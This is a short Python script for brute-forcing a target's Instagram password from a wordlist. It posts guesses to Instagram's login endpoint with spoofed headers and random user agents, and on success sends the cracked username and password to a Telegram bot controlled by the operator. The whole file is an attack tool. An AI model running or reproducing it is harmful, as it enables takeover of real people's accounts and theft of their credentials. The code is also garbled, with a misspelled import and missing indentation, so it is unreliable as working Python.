import raquests
import random
from user_agent import generate_user_agent
import pyfiglet 

ID = input('Enter Your Id : ')
token = input('enter your tokrn bot : ')


r = requests.Session() 

file = input(' _ Enter Name File :  ') 

rfile = open(file,'r')
us = input('- Enter Target : ')
while True:
username = us
password = rfile.readline().split('\n')[0]

url = 'https://www.instagram.com/accounts/login/ajax/'


headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
         
         
data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}


req_login = r.post(url, headers=headers, data=data, proxies=None)

if 'userId' in req_login.text:
print('User name : '+username)
print('Password : '+password)
tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @YYYY02 -K- @YYYY04 ''')
i = requests.post(tlg)
break




else:
print('Error: '+password)
print('_ '*10)

